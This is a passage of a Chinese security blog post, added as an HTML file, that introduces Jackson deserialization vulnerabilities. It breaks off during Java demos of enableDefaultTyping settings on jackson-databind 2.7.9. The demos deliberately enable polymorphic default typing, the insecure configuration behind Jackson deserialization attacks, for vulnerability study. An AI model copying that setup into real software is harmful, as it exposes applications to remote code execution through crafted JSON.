@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="且将新火试新茶，诗酒趁年华。  Jackson漏洞学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jackson漏洞分析">
+<meta property="og:url" content="http://example.com/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="ShadowFl0w">
+<meta property="og:description" content="且将新火试新茶，诗酒趁年华。  Jackson漏洞学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-15T07:16:22.000Z">
+<meta property="article:modified_time" content="2022-06-10T12:32:32.881Z">
+<meta property="article:author" content="ShadowFl0w">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Jackson漏洞分析 | ShadowFl0w</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ShadowFl0w</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="ShadowFl0w">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ShadowFl0w">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Jackson漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-15 15:16:22" itemprop="dateCreated datePublished" datetime="2021-12-15T15:16:22+08:00">2021-12-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 20:32:32" itemprop="dateModified" datetime="2022-06-10T20:32:32+08:00">2022-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>且将新火试新茶，诗酒趁年华。</p>
+</blockquote>
+<p>Jackson漏洞学习</p>
+<span id="more"></span>
+
+
+
+<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p>
+<p>我们知道在序列化和反序列时候容易出现漏洞，比如fastjon跟jackson都是序列化组件，漏洞层出不穷，当然Jackson也一样，历史上产生过不少漏洞</p>
+<h2 id="2-Jackson的序列化"><a href="#2-Jackson的序列化" class="headerlink" title="2. Jackson的序列化"></a>2. Jackson的序列化</h2><p>在jackson内部，提供了<code>ObjectMapper.writeValueAsString()</code>和<code>ObjectMapper.readValue()</code>两个方法来实现序列化和反序列化的功能。</p>
+<ul>
+<li><code>ObjectMapper.writeValueAsString()</code>———序列化</li>
+<li><code>ObjectMapper.readValue()</code>————————反序列化</li>
+</ul>
+<p>添加Maven依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p> Demo测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json,Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此用例我们jackson的ObjectMapper创建了一个mapper对象，然后用mapper对象进行序列化与反序列化</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectMapper mapper = <span class="keyword">new</span> <span class="constructor">ObjectMapper()</span>;</span><br><span class="line">序列化：</span><br><span class="line">mapper.write<span class="constructor">ValueAsString()</span></span><br><span class="line">反序列化：</span><br><span class="line">mapper.read<span class="constructor">Value()</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="3-Jackson多态类型的反序列化"><a href="#3-Jackson多态类型的反序列化" class="headerlink" title="3. Jackson多态类型的反序列化"></a>3. Jackson多态类型的反序列化</h2><p>如果对多态类进行反序列化，如何保证反序列化之后是我们想要的那个特定类呢。Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p>
+<p><strong>JacksonPolymorphicDeserialization</strong>具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种:</p>
+<ul>
+<li>DefaultTyping</li>
+<li>@JsonTypeInfo注解</li>
+</ul>
+<h3 id="3-1-DefaultTyping"><a href="#3-1-DefaultTyping" class="headerlink" title="3.1 DefaultTyping"></a>3.1 DefaultTyping</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.databind</span><span class="selector-class">.ObjectMapper</span>.DefaultTyping</span><br></pre></td></tr></table></figure>
+
+<p>Jackson提供一个enableDefaultTyping设置，其包含4个值：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">enum</span> <span class="title">DefaultTyping</span> </span>&#123;</span><br><span class="line">    JAVA_LANG_OBJECT,</span><br><span class="line">    OBJECT_AND_NON_CONCRETE,</span><br><span class="line">    NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">    NON_FINAL;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">DefaultTyping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-1-1-JAVA-LANG-OBJECT"><a href="#3-1-1-JAVA-LANG-OBJECT" class="headerlink" title="3.1.1  JAVA_LANG_OBJECT"></a>3.1.1  JAVA_LANG_OBJECT</h4><p>当类里的属性声明为一个Object时，会对该Object进行序列化和反序列化。</p>
+<p>通过<code>mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</code>设置<code>JAVA_LANG_OBJECT</code>属性</p>
+<p>我们在示例中新增一个Object对象，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由结果知，反序列化的时候只反序列化了Object的属性，没有将类给反序列化出来。</p>
+<p>如果我们添加JAVA_LANG_OBJECT属性。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置JAVA_LANG_OBJECT属性</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;jackson.Boy&quot;,&#123;&quot;length&quot;:100&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@4678c730</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反序列化的结果:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:20,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;jackson.Boy&quot;</span>,&#123;<span class="string">&quot;length&quot;</span>:100&#125;]&#125;</span><br><span class="line"><span class="attribute">age</span>=20, <span class="attribute">name</span>=shadowtest, jackson.Boy@4678c730</span><br></pre></td></tr></table></figure>
+
+<p>对比不添加JAVA_LANG_OBJECT的结果</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:20,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;length&quot;</span>:100&#125;&#125;</span><br><span class="line"><span class="attribute">age</span>=20, <span class="attribute">name</span>=shadowtest, &#123;<span class="attribute">length</span>=100&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以知道，添加JAVA_LANG_OBJECT属性可以一个类里的Object对象也给反序列出来。</p>
+<h4 id="3-2-2-OBJECT-AND-NON-CONCRETE"><a href="#3-2-2-OBJECT-AND-NON-CONCRETE" class="headerlink" title="3.2.2 OBJECT_AND_NON_CONCRETE"></a>3.2.2 OBJECT_AND_NON_CONCRETE</h4><p>当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。</p>
+<p>设置OBJECT_AND_NON_CONCRETE属性</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了测试，我们定义一个Sex接口，用MySex来继承。在Student中定义一个Sex属性，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE属性</span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 